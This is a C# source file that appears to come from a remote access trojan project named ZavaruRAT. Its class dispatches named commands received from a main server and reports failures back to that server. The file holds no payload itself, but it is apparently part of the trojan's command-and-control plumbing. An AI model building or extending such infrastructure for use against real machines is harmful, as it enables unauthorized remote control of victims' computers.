#region

using Google.Protobuf;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using ZavaruRAT.Node.Commands.Abstractions;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Node;

public sealed class NodeCommandsExecutor
{
    private readonly Dictionary<string, Type> _commands;
    private readonly MainServerClient _server;
    private readonly IServiceProvider _services;
    private readonly ILogger<NodeCommandsExecutor> _logger;

    public NodeCommandsExecutor(List<Type> commands, MainServerClient server, IServiceProvider services,
                                ILogger<NodeCommandsExecutor> logger)
    {
        _commands = commands.ToDictionary(x => x.Name, x => x, StringComparer.InvariantCultureIgnoreCase);
        _server = server;
        _services = services;
        _logger = logger;
    }

    public bool IsNodeCommand(CommandEvent command)
    {
        return _commands.ContainsKey(command.Command);
    }

    public async Task ExecuteNodeCommand(CommandEvent command, ZavaruStoredClient client)
    {
        var nodeCommand = (ICommand)_services.GetRequiredService(_commands[command.Command]);
        _logger.LogInformation("Executing node command {Command} ({Type})", command.Command, nodeCommand.GetType());

        try
        {
            await nodeCommand.ExecuteAsync(command, _server, client);
        }
        catch (Exception e)
        {
            _logger.LogError(e, "Error while executing node command");
            await _server.SendCommandExecutedAsync(new CommandExecutedEvent
            {
                Success = false,
                HashId = command.HashId,
                ClientId = command.ClientId,
                Result = ByteString.CopyFromUtf8(e.ToString())
            });
        }
    }
}
